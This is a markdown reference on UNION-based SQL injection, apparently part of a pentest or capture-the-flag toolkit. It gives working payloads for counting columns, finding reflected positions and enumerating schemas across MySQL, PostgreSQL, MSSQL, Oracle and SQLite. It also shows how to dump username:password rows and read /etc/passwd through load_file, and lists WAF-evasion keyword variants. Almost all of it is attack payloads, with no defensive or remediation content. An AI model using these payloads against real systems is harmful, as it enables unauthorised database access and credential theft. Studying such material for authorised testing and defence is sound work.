# UNION-based SQLi — column count, position, reflection, extraction

UNION attaches a second result set to the query. When one injected row
renders into the page, every subsequent value is one query away —
this is the fastest channel once it exists. The entire skill is:

1. name the column count,
2. find which positions render,
3. put an expression in a rendering position,
4. enumerate schema then rows.

Every payload below assumes injection inside a `SELECT` list context —
the overwhelmingly common case. For injection inside ORDER BY, LIMIT,
INSERT, UPDATE, see `edge-contexts.md` — UNION does not apply there
the same way.

---

## 1. Column count

### 1a. ORDER BY ramp — works everywhere, zero guessing

`ORDER BY N` sorts by the Nth selected column; N > column count is an
error in every DBMS. Ramp N until it errors:

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
... keep going until a generic error / HTTP 500 / empty page
```

The count is the last N that did NOT error. Numeric context drops the
quote: `1 ORDER BY 5-- -`. `tools/web/sqli_probe.py --order-by 30`
automates this ramp and reports the boundary.

Variants that still sort on the same index:

```text
' ORDER BY 5-- -
' GROUP BY 5-- -          (MySQL, Postgres — same overflow error)
' ORDER SIBLINGS BY 5-- - (Oracle hierarchical queries)
```

Traps:

- A WAF may block `ORDER` as a keyword. `oRDER` mixed case, `ORDER/**/BY`,
  `ORDER%20BY`, `ORDER\tBY` (tab is a separator in MySQL/MSSQL) are the
  first bypasses — full set in `waf-evasion.md`.
- Some apps catch the error and show a generic page — then an *empty*
  response at N and a normal response at N-1 IS the boundary; watch
  for the first *change*, not the first error.
- `ORDER BY` inside a subquery is allowed in MySQL but the outer
  query may wrap the value — if the ramp never errors, suspect a
  wrapping `LIMIT 1` or the input lands in a parenthesised subquery
  (see 1c).

### 1b. UNION NULL ramp — count without relying on ORDER BY

Start at 1 and grow the NULL list until the query succeeds:

```text
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -
```

Success = the count. This doubles as the type check later (NULL is
assignable to every column type, so a mismatched-type error never
fires during the ramp — that is exactly why NULL is used).

Dialect notes:

- **Oracle** requires `FROM` — use `FROM dual`:
  `' UNION SELECT NULL,NULL FROM dual-- -`
- **MSSQL / Access** sometimes need `--` without trailing space
  mangled by URL encoding: `%20` after `--`, or `--+` in URL form.
- **SQLite** accepts `NULL` columns and `UNION SELECT` fine.
- If `UNION` is filtered: `UnIoN`, `UNI/**/ON`, `UNIoN ALL` (ALL is
  often needed anyway and is more permissive through filters that
  check the exact two-word sequence `UNION SELECT`).

### 1c. When neither ramp converges

- Injection is inside a subquery with its own column list —
  `' ORDER BY` still works inside a parenthesised SELECT, but
  `UNION SELECT` may sit at the wrong level. Close the paren first:
  `') ORDER BY 3-- -`, `')) UNION SELECT ...-- -`.
- Injection is inside `VALUES(...)` of an INSERT — UNION does not
  apply; see `edge-contexts.md`.
- The app uses prepared statements for the main query but string
  concatenation for a filter/sort fragment — only ORDER BY / RLIKE /
  PROCEDURE tricks apply (see edge-contexts).
- The column count is huge (30+) — ORDER BY still converges; UNION
  ramp is tedious. Generate `NULL,`*N programmatically rather than
  by hand.

---

## 2. Which positions render

With count C known, fire one marker per position and watch where it
appears in the HTML:

```text
' UNION SELECT 'M1','M2','M3'-- -        -- then look for M1/M2/M3 in body
' UNION SELECT 0x4d31,0x4d32,0x4d33-- -  -- hex literals dodge quote filters
' UNION SELECT NULL,'MARK',NULL-- -      -- one at a time if types are picky
```

`tools/web/sqli_union.py --cols C find` does this sweep: marker per
position, reports which positions reflect and into which HTML element.

Type constraints:

- MySQL: very permissive — numbers and strings interconvert; a string
  marker in an int column works, and NULL everywhere works.
- Postgres: strict-ish — `NULL` fine, but `'M1'` into a numeric column
  errors. Probe with `'a'` at each position separately, or use `NULL`
  then replace one slot at a time.
- MSSQL: like Postgres; also `convert`-friendly.
- Oracle: strict; `TO_CHAR(1)` converts safely. Always `FROM dual`.
- SQLite: dynamically typed — anything goes.

Watch for:

- Multiple rendering positions — use the one inside the most visible
  element (a `<td>` beats a `<title>` truncated at 100 chars).
- Only the FIRST row of the UNION renders (app prints one record) —
  make the injected row the only row: `id=-1 UNION SELECT ...` or
  `id=1 AND 1=2 UNION SELECT ...` so the real row disappears.
- ORDER of rows: the real row may render first and the injected row
  get cut off by `LIMIT 1` in app logic — again, kill the real row
  with `AND 1=2` or a nonexistent id.
- Values that get uppercased/truncated by the template — put your
  delimiter INSIDE the extracted value, not around it.

---

## 3. The extraction expression

Once position P renders, replace it with an expression. The reliable
shape is `concat(delim, value, delim)` so a regex can grab it without
depending on surrounding HTML:

```sql
-- MySQL
concat(0x7e, version(), 0x7e)
concat(0x7e, user(), 0x7e)
concat_ws(0x3a, user(), database(), version())

-- Postgres / Oracle / MSSQL (|| is the concat operator)
'~'||version()||'~'
'~'||current_user||'~'

-- SQLite
'~'||sqlite_version()||'~'
```

`tools/web/sqli_union.py --pos P --expr 'concat(0x7e,version(),0x7e)'`
wraps this and regex-extracts `~...~`. Delimiter choice: `~` (0x7e)
survives most filters; `0x3a3a` (`::`) and `0x7c` (`|`) as alternates.

Value too long for the column? `substring(v,1,32)` windows:

```sql
concat(0x7e, substring(load_file('/etc/passwd'),1,200), 0x7e)
'~'||substr((select flag from flags),1,50)||'~'   -- then ,51,50 etc
```

Multiple columns needed in one visible slot — concat them:

```sql
group_concat(table_name,0x3a,column_name)              -- MySQL one-shot
'~'||string_agg(table_name||':'||column_name,',')||'~' -- Postgres
```

---

## 4. Schema enumeration — canonical chains

Replace `{pos}` with the rendering position. All payloads assume the
surrounding `' UNION SELECT NULL,{pos},NULL-- -` shell.

### MySQL / MariaDB

```sql
-- version, user, current db
concat(0x7e,@@version,0x7e)
concat(0x7e,system_user(),0x7e)
concat(0x7e,database(),0x7e)

-- all databases
group_concat(schema_name) FROM information_schema.schemata

-- tables in current db
group_concat(table_name) FROM information_schema.tables
  WHERE table_schema=database()

-- tables in a named db
group_concat(table_name) FROM information_schema.tables
  WHERE table_schema='appdb'

-- columns of one table
group_concat(column_name) FROM information_schema.columns
  WHERE table_name='users' AND table_schema='appdb'

-- the rows
group_concat(concat_ws(0x3a,username,password)) FROM appdb.users
```

Watch `group_concat_max_len` (default 1024): truncated lists are
common — page through with `LIMIT`:

```sql
group_concat(table_name) FROM information_schema.tables
  WHERE table_schema=database() LIMIT 0,30
group_concat(table_name) FROM information_schema.tables
  WHERE table_schema=database() LIMIT 30,30
-- or per-row:
(SELECT table_name FROM information_schema.tables
  WHERE table_schema=database() LIMIT 0,1)
(SELECT table_name FROM information_schema.tables
  WHERE table_schema=database() LIMIT 1,1)
```

### PostgreSQL

```sql
'~'||version()||'~'
'~'||current_user||'~'
'~'||current_database()||'~'

'~'||string_agg(datname,',')||'~' FROM pg_database
'~'||string_agg(tablename,',')||'~' FROM pg_tables
  WHERE schemaname='public'
'~'||string_agg(column_name,',')||'~' FROM information_schema.columns
  WHERE table_name='users'
'~'||string_agg(username||':'||password,',')||'~' FROM users
```

information_schema works too — `information_schema.tables`,
`.columns` — same names as MySQL.

### MSSQL

```sql
'~'+@@version+'~'
'~'+system_user+'~'
'~'+db_name()+'~'

'~'+name+'~' FROM master..sysdatabases
'~'+name+'~' FROM sysobjects WHERE xtype='U'          -- user tables
'~'+name+'~' FROM syscolumns WHERE id=(SELECT id FROM
  sysobjects WHERE name='users')
'~'+name+'~' FROM sys.tables
'~'+name+'~' FROM sys.columns WHERE object_id=
  OBJECT_ID('users')
```

MSSQL concat needs `+`, and `FOR XML PATH('')` for aggregation:

```sql
'~'+(SELECT name+',' FROM sys.tables FOR XML PATH(''))+'~'
```

### Oracle

```sql
'~'||banner||'~' FROM v$version WHERE rownum=1
'~'||user||'~' FROM dual
'~'||global_name||'~' FROM global_name

'~'||table_name||'~' FROM all_tables WHERE rownum=1
'~'||column_name||'~' FROM all_tab_columns
  WHERE table_name='USERS' AND rownum=1
-- paging by rownum:
'~'||table_name||'~' FROM (SELECT table_name,rownum r
  FROM all_tables) WHERE r=5
-- or OFFSET/FETCH on 12c+:
'~'||table_name||'~' FROM all_tables
  OFFSET 5 ROWS FETCH NEXT 1 ROWS ONLY
-- aggregate:
'~'||listagg(table_name,',') within group
  (order by table_name)||'~' FROM all_tables
```

### SQLite

```sql
'~'||sqlite_version()||'~'
'~'||name||'~' FROM sqlite_master WHERE type='table'
'~'||sql||'~' FROM sqlite_master WHERE name='users'  -- full CREATE
'~'||group_concat(name)||'~' FROM pragma_table_info('users')
```

---

## 5. Data extraction patterns

Once table and column names are known:

```sql
-- one row at a time (works on every DBMS that has LIMIT or rownum)
(SELECT concat(user,0x3a,pass) FROM users LIMIT 0,1)
(SELECT concat(user,0x3a,pass) FROM users LIMIT 1,1)
(SELECT username||':'||password FROM users OFFSET 0 LIMIT 1)

-- dump a whole small table into one reflected slot
group_concat(concat_ws(0x3a,id,username,password,0x0a)) FROM users
```

Ordering matters when paging blind: rows come back in arbitrary
order unless you say `ORDER BY` — for LIMIT paging always add
`ORDER BY id` (or any unique column) or rows can repeat/skip.

Cast issues:

- Postgres/MSSQL error on `int + string` — wrap numerics:
  `cast(id as text)` (PG) / `cast(id as varchar)` (MSSQL) / `to_char(id)` (Oracle).
- NULLs vanish inside concat chains on MySQL (`concat` of NULL is
  NULL) — use `concat_ws` which skips NULLs, or `ifnull(col,'')`.

---

## 6. UNION through a single reflected row

If the app shows exactly one record (detail page), the UNION row may
be second and invisible. Force it to be the only visible row:

```text
id=-1 UNION SELECT NULL,concat(0x7e,user(),0x7e),NULL-- -
id=1 AND 1=2 UNION SELECT NULL,version(),NULL-- -
id=999999 UNION SELECT ...                            -- id out of range
```

If the app shows N records, your row is one of N — still fine, grep
the page for the delimiter.

---

## 7. UNION with stacked terminators

Rare but real: the injected query runs as a SECOND statement
(stacked query). Then the syntax differs:

```text
'; SELECT * FROM users-- -            (MySQL: second result set — many drivers drop it)
'; SELECT pg_sleep(5)-- -             (Postgres JDBC/psycopg allow multi)
```

Most modern drivers disable stacked queries. If `;` just errors,
abandon stacked; UNION is the channel. MSSQL over OLEDB/ODBC and
Postgres over libpq DO stack — see `mssql.md`/`postgresql.md`.

---

## 8. DISTINCT/ALL and dedup tricks

- `UNION` dedupes (sorts), `UNION ALL` does not. When UNION fails
  with "different number of columns" but counts seem right, the
  app may already UNION — `UNION ALL SELECT` sometimes survives
  where UNION SELECT trips a parser check.
- `UNION DISTINCT SELECT` = UNION. `UNION ALL SELECT` preferred for
  performance and filter-bypass.

---

## 9. UNION when the query is INSERT/UPDATE (not applicable)

`UNION SELECT` cannot attach to `INSERT INTO t VALUES(%s)` or
`UPDATE t SET x=%s` — the grammar forbids it. Use subselects inside
the value: `',(SELECT password FROM users LIMIT 1),'x')-- -` —
full treatment in `edge-contexts.md`.

---

## 10. Failure diagnosis table

| Symptom | Likely cause | Next move |
|---|---|---|
| Every UNION errors regardless of NULL count | UNION keyword filtered | `waf-evasion.md` comment/case tricks |
| Errors stop but nothing renders | positions are non-text or clipped | probe each position with `'a'` singly |
| Only first NULL-list size works | count is right, types are wrong | replace one NULL with a string at a time |
| Value appears truncated | `group_concat_max_len` / column width | `substring` windows; `LIMIT` paging |
| Second UNION query never runs | app discards 2nd result set | kill real row (`AND 1=2`, `id=-1`) |
| `ORDER BY` works but UNION errors on every count | injection inside subquery | close parens first: `')`, `'))` |
| Page identical for all payloads | no injection at this point | wrong parameter or wrong context — `detection.md` |

---

## 11. UNION + WAF quick reference

```text
UNION -> UNIoN, UNION/**/, UN%49ON, UNION%20ALL, union all select
SELECT -> SELecT, SE/**/LECT, /*!50000SELECT*/, SELECt%20
FROM -> FROM, FrOm, F%52OM
NULL -> NuLL, NULL, CHAR(0x00) is NOT null — do not substitute
```

Full bypass catalogue in `waf-evasion.md`.
